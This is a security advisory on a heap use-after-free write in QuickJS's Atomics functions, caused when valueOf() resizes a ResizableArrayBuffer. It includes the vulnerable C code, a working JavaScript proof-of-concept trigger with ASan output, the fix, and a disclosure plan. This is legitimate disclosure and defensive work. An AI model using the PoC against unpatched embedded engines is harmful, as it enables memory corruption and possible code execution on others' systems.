# QuickJS Heap-Use-After-Free in Atomics Operations via ResizableArrayBuffer

**Researcher:** Mohamed Salem Eddah (@ze3ter_)  
**Severity:** High (CWE-416: Use After Free)  
**Status:** Unpatched in bellard/quickjs (latest master, d7ae12a)  
**Fixed in:** quickjs-ng (ptr re-fetched after value conversion)  
**Date discovered:** 2026-04-25  

---

## Summary

A heap-use-after-free write vulnerability exists in QuickJS's Atomics operations
(`Atomics.add`, `sub`, `and`, `or`, `xor`, `exchange`, `store`, `compareExchange`).
When a ResizableArrayBuffer (RAB) backs a TypedArray, value conversion of the
operand argument can invoke a user-defined `valueOf()` which calls
`ArrayBuffer.prototype.resize()`. This triggers `js_realloc()`, which frees the
old backing buffer and allocates a new one at a different address. The pointer
computed before value conversion is then used for the atomic operation, resulting
in a write to freed heap memory.

---

## Affected Files

- `quickjs.c` - functions `js_atomics_op()` and `js_atomics_store()`

---

## Root Cause

In `js_atomics_op()` (bellard/quickjs):

```c
// Step 1: get_ptr captures pointer into CURRENT buffer
if (js_atomics_get_ptr(ctx, &ptr, &p, &idx, &size_log2, &class_id,
                       argv[0], argv[1], 0))
    return JS_EXCEPTION;

// Step 2: value conversion - JS call! valueOf() can trigger rab.resize()
//         js_realloc() → OLD buffer freed, NEW buffer at different address
//         p->u.array.u.uint8_ptr updated to new address, but ptr is STALE
if (JS_ToUint32(ctx, &v32, argv[2]))   // <-- JS call
    return JS_EXCEPTION;

// Step 3: re-validate bounds (INSUFFICIENT - doesn't re-fetch ptr)
if (typed_array_is_oob(p))
    return JS_ThrowTypeErrorDetachedArrayBuffer(ctx);
if (idx >= p->u.array.count)
    return JS_ThrowRangeError(ctx, "out-of-bound access");

// Step 4: USE STALE ptr → heap-UAF write!
a = atomic_fetch_add((_Atomic(uint32_t) *)ptr, v);   // quickjs.c:59151
```

The re-validation in step 3 correctly detects buffer shrinkage (idx OOB)
and detachment, but does NOT re-fetch `ptr`. If the buffer was reallocated
to a larger or equal size (idx remains valid), the stale `ptr` pointing to the
freed buffer is used for the atomic write.

---

## Proof of Concept

Minimal 9-line PoC (confirmed with ASan):

```javascript
// poc_minimal.js
const rab = new ArrayBuffer(4, { maxByteLength: 4 * 1024 * 1024 });
const ta  = new Int32Array(rab);

const evil = {
  valueOf() {
    rab.resize(4 * 1024 * 1024);  // realloc → moves ptr, old region freed
    return 1;
  }
};

Atomics.add(ta, 0, evil);  // CRASH: heap-use-after-free write at quickjs.c:59151
```

### ASan Output

```
ERROR: AddressSanitizer: heap-use-after-free on address 0x7b62f33e0650
WRITE of size 4 at 0x7b62f33e0650 thread T0
    #0 js_atomics_op quickjs.c:59151
freed by thread T0 here:
    #0 realloc (/qjs_test+0x22c050)
    #1 js_def_realloc quickjs.c:1784
previously allocated by thread T0 here:
    #0 malloc
    #1 js_def_malloc quickjs.c:1746
```

---

## Affected Operations

All 8 Atomics functions are vulnerable:

| Function | Trigger | Impact |
|---|---|---|
| `Atomics.add(ta, idx, evil)` | `evil.valueOf()` resizes | UAF write |
| `Atomics.sub(ta, idx, evil)` | same | UAF write |
| `Atomics.and(ta, idx, evil)` | same | UAF write |
| `Atomics.or(ta, idx, evil)` | same | UAF write |
| `Atomics.xor(ta, idx, evil)` | same | UAF write |
| `Atomics.exchange(ta, idx, evil)` | same | UAF write |
| `Atomics.store(ta, idx, evil)` | same | UAF write |
| `Atomics.compareExchange(ta, idx, evil, rep)` | `evil.valueOf()` | UAF write |
| `Atomics.compareExchange(ta, idx, exp, evil)` | `evil.valueOf()` | UAF write |

Tested: bellard/quickjs master commit d7ae12a (2026-03-23, latest).

---

## Impact

- **Memory corruption**: controlled 4/8-byte write to freed heap region
- **Exploitation**: freed region can be reclaimed with controlled content
  → potential arbitrary code execution in environments running untrusted JS
- **Deployment risk**: QuickJS is widely embedded in IoT firmware, game engines,
  serverless runtimes, and developer tools

---

## Fix

Re-fetch `ptr` from `p->u.array.u.uint8_ptr` AFTER value conversion and
AFTER the bounds re-validation. quickjs-ng already applies this fix:

```c
/* check if an evil .valueOf has resized or detached the array */
if (idx >= p->u.array.count)
    return JS_ThrowRangeError(ctx, "out-of-bound access");

// Re-fetch ptr AFTER value conversion (fixes UAF):
ptr = p->u.array.u.uint8_ptr + ((uintptr_t)idx << size_log2);
```

Apply the same pattern to both `js_atomics_op()` and `js_atomics_store()`.

---

## Disclosure Plan

1. Open GitHub issue on bellard/quickjs with this report
2. Request CVE via MITRE CNA (GitHub Advisory, or direct MITRE request)
3. 7-day patch window before public disclosure
4. Cross-check quickjs-ng fix (already patched - reference their fix)
